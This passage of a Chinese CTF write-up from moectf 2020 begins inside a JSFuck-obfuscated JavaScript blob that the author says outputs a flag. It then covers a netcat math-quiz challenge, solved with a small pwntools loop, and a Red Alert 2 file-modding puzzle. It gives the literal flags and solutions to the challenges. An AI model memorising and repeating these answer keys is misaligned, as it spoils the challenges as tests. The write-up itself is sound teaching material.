+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]])+[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[+!+[]])+[])+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]])</span><br></pre></td></tr></table></figure>
+
+<p>虽然看起来怪怪的，但是这也是一个正常的js脚本</p>
+<p>运用js的特性、只通过<code>[]()+!</code>六个字符进行编写的js脚本语言称之为<strong>JSFUCK</strong></p>
+<p>直接当成常规的js脚本运行即可得到flag</p>
+<p><img src="https://i.loli.net/2020/10/08/U9AtnyfguvRT8Mc.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;J5Fxck_1s_1nt3res7in9!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="⑨的完美算术教室"><a href="#⑨的完美算术教室" class="headerlink" title="⑨的完美算术教室"></a>⑨的完美算术教室</h2><blockquote>
+<p>注：本题借鉴了moectf2018的某道misc题</p>
+</blockquote>
+<p>nc，连上后发现题目会给我们各种不同的代数算式让我们解答</p>
+<p><img src="https://i.loli.net/2020/10/08/zvZ8fL4ajuQrgBR.png" alt="image.png"></p>
+<p>我们可以发现无论算式是啥，只有当我们输入字符<code>9</code>的时候程序才能继续运行下去，故尝试一直输入<code>9</code></p>
+<p>输入99次后我们便得到了flag</p>
+<p><img src="https://i.loli.net/2020/10/08/s3OynaXBTk1hHEG.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;c1rn0_1s_tH3_5tr0n9est!&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注：我们也可以使用python脚本自动输入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'sec.arttnba3.cn'</span>,<span class="number">10001</span>)</span><br><span class="line">result = p.recv()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendline(<span class="string">b'9'</span>)</span><br><span class="line">        result = p.recv()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/10/08/JtsWgfSHCvx2TkF.png" alt="image.png"></p>
+</blockquote>
+<h2 id="闪-电-风-暴"><a href="#闪-电-风-暴" class="headerlink" title="闪 电 风 暴"></a>闪 电 风 暴</h2><blockquote>
+<p> 一道比较简单的游戏安利题（确信</p>
+</blockquote>
+<p>题目名称为【闪电风暴】，闪电风暴是红色警戒中【盟军】阵营的超级武器，但是我们可以发现在这个mod包中的盟军并没有【天气控制仪】，也就无法释放超级武器【闪电风暴】</p>
+<p><img src="https://i.loli.net/2020/10/08/XfNGZtB9IwheKMW.png" alt="image.png"></p>
+<p>那么我们不难猜到只要把【天气控制仪】修改出来便可以得到flag</p>
+<p>百度可以知道红警的规则文件为<code>rulesmd.ini</code>，但是很明显我们在文件夹下并不能发现这个文件</p>
+<p><img src="https://i.loli.net/2020/10/08/vLb9BGnxU6gXYFj.png" alt="image.png"></p>
+<p><strong>免费的hint</strong> 提示<code>XCC MIXER</code>，百度可以知道这个软件是用来从后缀名为<code>*.mix</code>的文件中提取游戏资源文件的</p>
+<p><img src="https://i.loli.net/2020/10/08/A6EFvSJ4iQpjaMs.png" alt="image.png"></p>
+<p>我们不难看到包内有很多的<code>*.mix</code>文件，猜测<code>rulesmd.ini</code>可能存在于其中一个当中</p>
+<p><img src="https://i.loli.net/2020/10/08/vVABX38Ki6uLrme.png" alt="image.png"></p>
+<p>但是这个时候我们会发现相当一部分的mix文件都无法使用<code>XCC MIXER</code>打开，考虑到题目文本中有写道：</p>
+<p><img src="https://i.loli.net/2020/10/08/5N9jnd8zmtfwOuE.png" alt="image.png"></p>
+<p>故可以得知存放<code>rulesmd.ini</code>的mix文件应该是被加密了，同时由于我们不知道加密方式如何，故先考虑从其他可以打开的mix文件中寻找有用的信息</p>
+<p>在<code>expandmd94.mix</code>文件中我们可以发现这样一个名字可疑的文件：<code>winhex.shp</code>，使用xcc mixer提取出来</p>
+<p><img src="https://i.loli.net/2020/10/08/eiczTy3HB5pDmNZ.png" alt="image.png"></p>
+<p>还是百度，我们可以知道这种文件需要使用<code>shp builder</code>打开</p>
+<p><img src="https://i.loli.net/2020/10/08/g7BfXK5VFrsjPJ8.png" alt="image.png"></p>
+<blockquote>
+<h3 id="hint-1"><a href="#hint-1" class="headerlink" title="hint-1"></a>hint-1</h3><p>hint1提示：</p>
+<p><img src="https://i.loli.net/2020/10/08/LCmrMvXi4176Ka8.png" alt="image.png"></p>
+<p>我们可以看到网盘的名字为<code>arttnba3的永硕网盘</code>，但是链接却是<a href="http://kiriko.ys168.com" target="_blank" rel="noopener">http://kiriko.ys168.com</a></p>
+<p><img src="https://i.loli.net/2020/10/08/uso4xVS6PBq3eKF.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">故我们考虑将链接改为[http:&#x2F;&#x2F;arttnba3.ys168.com](http:&#x2F;&#x2F;arttnba3.ys168.com)</span><br><span class="line"></span><br><span class="line">进入该网盘即可得到一套红警修改常用工具，其中就包括&#96;&#96;&#96;SHP BUILDER </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/10/08/WlUKzNnR56c29mA.png" alt="image.png"></p>
+</blockquote>
+<p>软件<code>shp builder</code>告诉我们这个shp文件一共有114帧，我们可以发现其中大部分都是纯色帧，考虑神必数字<code>114514</code>，我们可以在第51帧发现不一样的东西，但是颜色很明显不对劲</p>
+<p><img src="https://i.loli.net/2020/10/08/naN1Du27iyLxdrU.png" alt="image.png"></p>
+<p>老百度人可以知道一个叫做<code>调色板</code>的东西</p>
+<p><img src="https://i.loli.net/2020/10/08/l13R46VYfx9eb5a.png" alt="image.png"></p>
+<p>使用翻译软件我们可以知道<code>调色板</code>的英文是<code>palette</code>，对应的在<code>shp builder</code>上方我们也可以看到一个<code>palette</code>按钮</p>
+<p><img src="https://i.loli.net/2020/10/08/KwufTlbtM7A3r4U.png" alt="image.png"></p>
+<p>点击选择<code>Red Alert 2</code>一栏的第一个<code>anim.pal</code>，我们发现图片变得正常了起来</p>
+<p><img src="https://i.loli.net/2020/10/08/rp3luSN52OCIAos.png" alt="image.png"></p>
+<p>使用<code>winhex</code>打开被加密的几个mix文件，我们可以发现<code>expandmd98.mix</code>文件的末尾offset刚好也在<code>00530F20</code>附近，不同的是比<code>winhex.shp</code>中多了一段</p>
+<p>我们尝试将这一段多出来的数据删掉后发现该文件便可以使用xcc mixer打开了，同时我们可以发现<code>rulesmd.ini</code>文件就在里面</p>
+<p><img src="https://i.loli.net/2020/10/08/bX3z5lheLdYI79a.png" alt="image.png"></p>
+<blockquote>
+<h3 id="hint-2"><a href="#hint-2" class="headerlink" title="hint - 2"></a>hint - 2</h3><p>hint2提示了我们选择相应的调色盘以及对比mix文件尾数据找出正确的mix文件</p>
+<p><img src="https://i.loli.net/2020/10/08/RYecQ3KJW7rbkjZ.png" alt="image.png"></p>
+</blockquote>
+<p>使用xcc mixer提取出来，我们只需要改出【天气控制仪】或许就能得到flag</p>
+<p>不会修改也没关系，闪电风暴直译是【lightningstrom】，搜索即可找到天气控制仪【weather control device】的代码</p>
+<p><img src="https://i.loli.net/2020/10/08/2sbVG16BrkJEOM8.png" alt="image.png"></p>
+<p>其中的参数都是比较简单易读的：</p>
+<ul>
+<li>Cost：很明显是价格，改一个低一点的即可</li>
+<li>RequiredHouses：后面跟着一个<code>China</code>提示我们这应当指的是需求的国家，也就是只有这个国家能够进行建造的意思，改为任一盟军阵营国家名即可，可以参照上方的<code>Owner</code>语句得到国家名；当然，如果是比较熟悉红警的小伙伴应该知道这个语句是可以直接删除的</li>
+<li>BuildLimit：建造限制，推测是数量限制，-1自然无法建造，随便改一个正数即可</li>
+<li>TechLevel：科技等级，我们在遭遇战页面是可以看到有个调节科技等级1至10的选项的，这里等级为-1自然无法建造，改为1至10中任一整数即可</li>
+</ul>
+<p>我们可以发现游戏中提示我们<strong>FLAG内容在超武里</strong></p>
+<p><img src="https://i.loli.net/2020/10/08/Ud17cPvarkSs2my.png" alt="image.png"></p>
+<p>但是如果我们仅改掉这些限制条件，我们会发现出来的并不是正确的flag（th1s_1s_f4ke_fla9!👉this is fake flag）</p>
+<p><img src="https://i.loli.net/2020/10/08/8rR1fjKBd2xhqQL.png" alt="image.png"></p>
+<p>考虑到题目中有写道<strong>【添加了一个真·闪电风暴】</strong>，故我们可以知道flag应该不是藏在原超级武器中</p>
+<p><img src="https://i.loli.net/2020/10/08/DTwjCNSy5Fq6ga2.png" alt="image.png"></p>
+<p>我们重新回到<code>rulesmd.ini</code>，可以发现如下语句</p>
